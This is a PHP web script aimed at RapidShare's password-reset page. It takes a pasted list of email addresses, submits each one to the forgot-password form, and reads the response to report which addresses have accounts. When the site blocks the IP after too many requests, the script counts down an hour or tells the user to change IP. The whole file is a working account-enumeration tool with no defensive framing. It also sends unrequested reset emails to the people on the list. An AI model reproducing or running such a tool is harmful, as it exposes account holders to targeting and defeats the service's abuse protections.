<?php

	session_start();
	
	$browserData = array();
	$browserData[CURLOPT_USERAGENT]      = "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9";
	$browserData[CURLOPT_FOLLOWLOCATION] = true;	
	$browserData[CURLOPT_COOKIESESSION]  = true;
	$browserData[CURLOPT_COOKIEFILE]     = "cookie";
	$browserData[CURLOPT_COOKIEJAR] 	 = "cookie";

	function curlInit($link,&$browserData,$ssh = false)
	{
		$ch = curl_init($link);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, !$ssh);
		curl_setopt_array ($ch,$browserData);		
			
		return $ch;
	}
	function array2postFields($data)
	{
		$data = (array) $data;		
		
		$postData = "";			
		foreach($data as $name => $value)
			$postData .= $name . "=" . $value . "&";			
		$postData = substr($postData,0,-1);
		
		return $postData;
	}
	
	class rapidshare
	{
		function __construct(&$browserData)
		{
			$this->browserData = &$browserData;			
			$this->link = "http://rapidshare.com/cgi-bin/forgotpw.cgi";								
		}
		
		function requestpassword($username)
		{			
			$ch = curlInit($this->link,$this->browserData,false);

			$data = array("email"=>$username);

			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS,array2postFields($data));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$responseText = curl_exec($ch);
			curl_close($ch);	
			
			
			return $responseText;
			
			
		}

		function translateResponse($responseText)
		{
			$responseRegexs = array(
										"noaccounts" => "No accounts found. Please try again",
										"valid"      => "accounts and sent the data to your e-mail address",
										"invalid"    => "E-Mail address invalid!",
										"ipblocked"  => "Too many password requests from your IP-Address! Please try again in one hour"
									);
			foreach($responseRegexs as $name => $value)
				if (preg_match('%' . $value . '%', $responseText))
					return $name;			
			return false;
		}
		function testUser(&$user)
		{
			$responseText = $this->requestpassword($user["username"]);
			
			$response = $this->translateResponse($responseText);
			
			if($response == "ipblocked" || !$response)
			{
				echo "<div style='margin-bottom:2%;'>IP BLOCKED. Next try in <span id='clock'></span> seconds. Leave the window opened for autorefresh, or change your ip</div>";
				$waitingTime = 3610;
				$clockScript=
<<<CLOCK
		<script>
		waitingTime = $waitingTime;			
		function showClock()
		{
			clockHolder = document.getElementById("clock");
			clockHolder.innerHTML = waitingTime--;
		}		
		showClock();
		window.setInterval(showClock,1000);
		
		</script>
CLOCK;
				echo $clockScript;
				
				echo "<META HTTP-EQUIV='Refresh' CONTENT='{$waitingTime};URL='>";
				return false;
			}
			else
			{
				$user["response"] = $response;
				return true;
			}
			
		}
	}
?>

<body style="background-color:black;color:white">
<?php
	
	if(isset($_GET["reset"]))
		$_SESSION = array();
		
	$users   = &$_SESSION["users"];	
	$info    = &$_SESSION["info"];
					
	if(!isset($users))
	{
		if(!empty($_POST["users"]))
		{
			    function validUsername(&$username)
				{
					$username = strtolower($username);
					return preg_match('/\A[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}\Z/',$username);
				}
				$users = array();				
				$lines = explode("\n",$_POST["users"]);				
				foreach($lines as $line)
				{
					if (get_magic_quotes_gpc()) 
						$line = stripslashes($line);
						
					$username = trim($line);
					
					if(validUsername($username))
					{
						$users[] = array(
											"username" => $username,											
											"response" => false
										 );		
					}
				}
				
				$info["nUsers"]      = count($users);
				$info["currentUser"] = 0;
				
				if(!$info["nUsers"])
				{
					$_POST = array();
					$_SESSION = array();
				}
		}
		
		if(empty($_POST["users"]))
		{
			?>
			<div>Give me some list of emails</div>
			<div>You can freely refresh the window</div>
			<form action="?" method="POST">
			<textarea cols="50" rows="25" name="users" onclick="this.innerHTML='',this.onclick=''">email1@server.com
email2@server.com</textarea><br>	
			<input type="submit" value="submit">
			</form>
			<?php
		}
	}
	
	if(isset($users))
	{	
		$rapidshare = new rapidshare($browserData);		
		
		$exec = $_GET["exec"];
		
		if(isset($exec))
		{
			for($n = $info["currentUser"] ; $n < $info["nUsers"]; $n++)
			{		
				if ($rapidshare->testUser($users[$n]))
					$info["currentUser"]++;
				else
				{
					break;
				}
			}
		}
		
		echo "Tested: " . $info["currentUser"] . " users<br><br>";
		
		for($n = 0 ; $n < $info["currentUser"]; $n++)
		{
			$user = $users[$n];
			printf("Username: %s - ",$user["username"]);
				
			switch($user["response"])
			{
				case "invalid":
				{
					echo "doesn't work. invalid";
					break;
				}
				case "noaccounts":
				{
					echo "doesn't work";
					break;
				}
				case "valid":
				{
					echo "<b>just WORKS!</b>";
					break;
				}
				default:
				{
					echo ".unable to test. Contact the author";
				}
			}
			echo "<br>";		
		}
		echo "<div><a href='?exec'>EXEC</a></div>";
	
	}
		
		
	

?>
<div><a href="?reset">RESET</a></div>
</body>